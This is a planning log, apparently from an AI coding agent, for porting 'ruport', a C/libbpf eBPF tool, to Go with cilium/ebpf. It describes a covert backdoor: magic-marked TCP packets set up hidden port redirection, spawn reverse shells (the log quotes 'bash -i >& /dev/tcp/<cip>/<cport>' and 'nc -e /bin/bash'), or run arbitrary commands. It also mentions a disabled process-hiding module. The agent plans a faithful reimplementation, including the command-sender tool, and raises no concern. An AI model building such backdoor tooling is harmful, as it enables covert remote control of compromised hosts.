@@ -1,0 +1,114 @@
+ruport-go 移植方案理解与确认日志
+====================================
+时间: 2026-08-27 21:13:15
+分支: develop
+状态: 待用户确认（未开始写任何实现代码）
+
+一、用户请求复述
+----------------
+用户要求：参照 D:\SideProjects\Projects\ruport（C/libbpf 实现）的功能，
+在当前目录 D:\SideProjects\Projects\ruport-go 下，使用 Golang 并基于
+Cilium（cilium/ebpf 库）重新实现同样的功能。需遵守 AGENTS.md 全部规则。
+
+二、对原项目 ruport 功能的理解（逐文件通读后）
+----------------
+1. 整体架构：三个 eBPF 程序 + 一个用户态控制程序 + 一个外部指令发送脚本。
+   实际在 main() 中只启用了 XDP 与 TC 两类 eBPF；pidhide（进程隐藏，
+   移植自 bad-bpf）的加载代码被注释，处于禁用状态。
+
+2. XDP 程序（ruport.xdp.c，xdp_parse，SKB 模式挂载，返回 XDP_PASS 不影响业务）：
+   - 解析经过网卡的 IPv4/TCP 包，取 TCP payload；
+   - payload 前 12 字节为魔术标记：s1(2字节) + s2(2字节) + s3(8字节)，
+     满足 s1^2 + s2^2 = s3（小端序），否则忽略；
+   - 匹配后从 payload 偏移 12 处解析 struct Message（共 124 字节）：
+     ins(2) | cip(4) | cport(2) | connport(2) | nativeport(2) | ext(100)；
+   - 以 key = (cip<<16) + cport 写入 message_map（哈希表，最多 1024 项），
+     已存在则不覆盖。
+
+3. TC 程序（ruport.tc.c，clsact，egress/ingress 各一个 filter，priority=1 handle=1）：
+   - router_map：key = (ip<<16) + port，value = Router{cip, cport, connport, nativeport}；
+   - tc_ingress（入站）：若源IP/源端口命中 router_map 且等于 value 的
+     cip/cport 且 nativeport != 0，则把目的端口改写为 nativeport（DNAT 到
+     本地真实服务端口），bpf_skb_store_bytes + bpf_l4_csum_replace 更新校验和；
+     若 connport == 0，顺便学习记录实际目的端口为 connport；
+   - tc_egress（出站）：若目的IP/目的端口命中 router_map 且 connport != 0，
+     则把源端口改写为 connport（SNAT），更新校验和；若 nativeport == 0，
+     学习记录实际源端口为 nativeport；
+   - 效果：对外只开放一个端口（如 80），带魔术标记的指令包建立路由后，
+     控制端流量被透明转发到本地隐秘端口，回包源端口被改回出网端口，
+     实现端口复用。
+
+4. 用户态控制程序（ruport.c）：
+   - 参数：-i 网卡名（缺省时自动读 /proc/net/dev，选 tx 字节数最大的
+     非 lo 网卡）、-p 端口（解析但未参与逻辑）、-H（隐藏进程，pidhide
+     已禁用故无效）；
+   - 挂载 XDP（XDP_FLAGS_SKB_MODE）与 TC egress/ingress；
+   - 启动后台线程每 1 秒轮询 message_map：逐 key lookup_and_delete 取出
+     消息，先 control_router 再 control_process；
+   - control_router：指令高字节 > 0 为删除路由（lookup_and_delete
+     router_map）；否则为添加（已存在则跳过；ins 低字节 01/02/03 写入
+     router_map，其中 01 要求 nativeport != 0，C 代码存在 fallthrough）；
+   - control_process 按低字节：
+     01 仅添加路由，不做处理；
+     02 反弹连接：ext=="bash" 时 fork 执行
+        sh -c "bash -i >& /dev/tcp/<cip>/<cport> 0>&1"；
+        ext=="nc" 时 fork 执行当前目录下 ./nc <ip> <port> -e /bin/bash，
+        并把子进程 pid 记入链表；高字节>0（删除）时按 (cip,cport) 找到
+        节点并 kill(pid, SIGINT)；
+     03 执行 shell 命令：fork 执行 sh -c <ext>；
+     04 执行程序：原代码为空，未实现；
+   - SIGINT/SIGSEGV：卸载 XDP、销毁 TC hook 后退出。
+
+5. 指令发送端 insTool/c3.py：构造 124 字节魔术包，通过 TCP 连到被控端
+   对外开放端口发送；命令行 -t 目标 -p 端口 -S 控制端IP -P 控制端端口
+   -x 出网端口(p1/connport) -y 功能端口(p2/nativeport) -e 扩展 -i/-1..-4
+   指令 -d 删除。
+
+三、Go + cilium/ebpf 实现方案（拟确认）
+----------------
+1. 语言与库：Go + github.com/cilium/ebpf；eBPF 侧仍为 C 代码，用官方
+   bpf2go 工具生成 Go 绑定（取代 bpftool gen skeleton）。
+2. eBPF 源码：新建 bpf/ 目录，放置与原版逻辑一致的 XDP 与 TC 两个
+   .bpf.c（魔术校验、message_map/router_map、端口改写与校验和更新
+   逻辑逐行对应移植，不改行为）。
+3. 挂载方式：
+   - XDP：cilium/ebpf link.AttachXDP（SKB 模式，对应原 XDP_FLAGS_SKB_MODE）；
+   - TC：cilium/ebpf 无经典 clsact attach API，使用 vishvananda/netlink
+     创建 clsact qdisc 并挂 egress/ingress filter（等价于原
+     bpf_tc_hook_create/bpf_tc_attach，priority=1 handle=1），卸载时
+     对应删除，行为与原版一致；
+4. 用户态：main.go 解析 -i/-p/-H 参数；缺省网卡自动选择逻辑读
+   /proc/net/dev（原 C 代码 txbytes 未初始化属偶然生效，Go 版初始化为 0，
+   属忠实修复，不改变功能）；goroutine 每秒轮询 message_map（ Iterate +
+   LookupAndDelete 语义）执行 control_router / control_process；
+   02 反弹用 exec.Command(...).Start()（等价 fork+exec 不 wait），
+   nc 仍要求在同目录、记录 pid、删除时 syscall.Kill(pid, SIGINT)；
+   03 用 exec.Command("/bin/sh","-c",ext).Start()；04 保持未实现；
+   signal.Notify(SIGINT) 卸载全部挂载后退出。
+5. c3 指令发送工具：拟一并提供 Go 版 cmd/c3（命令行参数与 c3.py 完全
+   一致），这是"同样功能"的组成部分；如不需要可去掉。
+6. 不移植/不启用 pidhide（原版即已注释禁用），不加原版没有的功能。
+7. 构建：提供 Makefile（bpftool btf dump 生成 vmlinux.h、bpf2go 生成
+   绑定、go build）。本机为 Windows，eBPF 编译与最终构建需在 Linux
+   （Debian/Ubuntu，clang + 内核 BTF）上执行 make；交付以代码 + 构建
+   说明为准。
+8. 目录结构（拟）：
+   ruport-go/
+     bpf/ruport_xdp.bpf.c, bpf/ruport_tc.bpf.c
+     cmd/ruport/main.go（控制主程序）
+     cmd/c3/main.go（指令发送端，可选）
+     internal/...（加载/挂载/消息处理/日志等拆分）
+     Makefile, README.md, go.mod
+
+四、对原有流程/布局的影响
+----------------
+- 全部为当前空仓库（ruport-go，仅 AGENTS.md 与 .gitignore）内新增文件，
+  不改动 D:\SideProjects\Projects\ruport 原项目任何内容；
+- 不改变原项目功能语义，仅做语言/库层面的等价移植；
+- 每完成一个实质性修改按 AGENTS.md 规则 5 提交 git。
+
+五、待用户确认的问题
+----------------
+1. 以上对功能范围的理解是否正确？
+2. c3 指令发送工具是否需要 Go 版一并实现（建议：是）？
+3. pidhide 维持不移植/不启用（与原项目当前状态一致）是否可接受？
